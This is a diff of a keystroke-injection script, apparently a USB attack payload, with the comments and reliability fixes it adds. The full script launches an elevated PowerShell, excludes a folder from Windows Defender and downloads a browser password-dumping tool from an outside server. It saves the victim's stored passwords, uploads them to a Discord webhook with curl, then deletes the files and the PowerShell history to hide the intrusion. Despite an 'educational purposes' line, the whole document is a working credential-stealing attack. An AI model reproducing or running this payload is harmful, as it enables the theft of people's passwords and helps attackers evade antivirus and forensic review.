@@ -1,58 +1,69 @@
 REM This is a modified script by DEFHerobrine that: 1. stops windows anti-virus 2. installs file that finds stored passwords 3. sends to discord and removes any traces
 REM 1. stops windows anti-virus 2. installs file that finds stored passwords 3. sends html to discord 4. removes any traces
+REM For educational purpouses only, please handle with care.
+REM Open the Run dialog
 GUI r
 DELAY 1000
+
+REM Run PowerShell as administrator
 STRING powershell -Noprofile "Start-Process powershell -verb runas"
 ENTER
 DELAY 2000
+
+REM Press LEFT to select "Yes" on the UAC prompt (if required)
 LEFT
 DELAY 50
 ENTER
 DELAY 1500
-STRING $webhook = 'YOUR DISCORD WEBHOOK'
+
+REM Define the Discord webhook URL where the data will be sent
+STRING $webhook = 'YOUR_WEBHOOK_HERE'
 ENTER
 DELAY 500
-STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
+
+REM Check if the C:\temp folder exists, if not, create it
+REM Add C:\temp as an exclusion in Windows Defender
+REM Set PowerShell's execution policy to unrestricted
+STRING if (-Not (Test-Path -Path 'C:\temp')) {mkdir 'C:\temp'} ; cd C:\temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted -Force
 ENTER
 DELAY 500
-STRING A
+
+REM Remove any existing files from previous runs: webpassview.zip, 7z.zip, and the 7z folder (if they exist)
+STRING if (Test-Path -Path 'webpassview.zip') {Remove-Item -Path 'webpassview.zip' -Force} ; if (Test-Path -Path '7z.zip') {Remove-Item -Path '7z.zip' -Force} ; if (Test-Path -Path '7z') {Remove-Item -Path '7z' -Recurse -Force}
 ENTER
-STRING clear
-ENTER
-DELAY 1500
-STRING Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip;
+DELAY 500
+
+REM Download WebBrowserPassView and 7-Zip from a server
+STRING Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip -DestinationPath 7z -Force
 ENTER
 DELAY 5000
+
+REM Extract the contents of webpassview.zip using 7-Zip
+STRING .\7z\7za.exe e webpassview.zip -y
+ENTER
+DELAY 5000
+
+REM Run WebBrowserPassView to extract saved browser passwords
 STRING .\WebBrowserPassView.exe
 ENTER
 DELAY 1500
+
+REM Select all the data in the WebBrowserPassView window
 CTRL A
 DELAY 500
+
+REM Open the Save dialog to save the extracted data
 CTRL S
-DELAY 1500
-CTRL L
-DELAY 100
-STRING C:\Temp
-DELAY 75
-ENTER
-DELAY 100
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-STRING temp.html
+DELAY 2500
+
+REM Input the file path for saving the output: C:\temp\temp.html
+STRING C:\temp\temp.html
 ENTER
 DELAY 500
+
+REM Use Alt+F to open the file menu and save the file
 ALT f
-DELAY 500
+DELAY 1500
 DOWN
 DOWN
 ENTER
@@ -60,20 +71,32 @@ DELAY 3000
 ENTER
 ENTER
 DELAY 1000
-STRING curl.exe -F "file1=@temp.html" $webhook
+
+REM Use curl to send the saved temp.html file to the specified Discord webhook
+STRING curl.exe -F "file1=@C:\temp\temp.html" $webhook
+ENTER
+DELAY 2000
+
+REM Remove the temp.html file from the system after sending it
+STRING Remove-Item -Path "C:\temp\temp.html" -Force
 ENTER
 DELAY 1000
-STRING clear ; cd .. ; rm -r temp/ 
+
+REM Clear the PowerShell window, navigate out of the temp directory, and delete the temp folder
+STRING clear ; cd .. ; rm -r temp/ -Force
 ENTER
 DELAY 1000
-STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy restricted
+
+REM Remove the exclusion for C:\temp from Windows Defender and set the execution policy back to restricted
+STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy restricted -Force
 ENTER
 DELAY 1500
-STRING A
-ENTER
-DELAY 1000
-STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+REM Delete the PowerShell command history to remove traces of the script
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath -Force
 ENTER
 DELAY 500
+
+REM Exit the PowerShell session
 STRING exit
 ENTER
